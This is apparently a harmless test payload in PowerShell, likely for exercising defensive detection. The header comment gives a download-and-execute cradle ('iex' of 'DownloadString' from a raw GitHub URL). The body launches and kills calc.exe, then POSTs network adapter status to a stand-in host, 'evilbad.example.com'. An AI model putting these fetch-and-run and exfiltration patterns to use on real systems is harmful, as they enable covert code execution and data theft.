## to be executed as; powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaywoz/powershelling/master/blue/Payload-nonsense.ps1')"

##pop calc
calc.exe
sleep 5
## kill calc
get-process *calc* | stop-process

## gather netadapter state and post to example.com/foobar
$postParams = (Get-NetAdapter | select status | findstr Up)
Invoke-WebRequest -Uri http://evilbad.example.com/foobar -Method POST -Body $postParams -ErrorAction SilentlyContinue
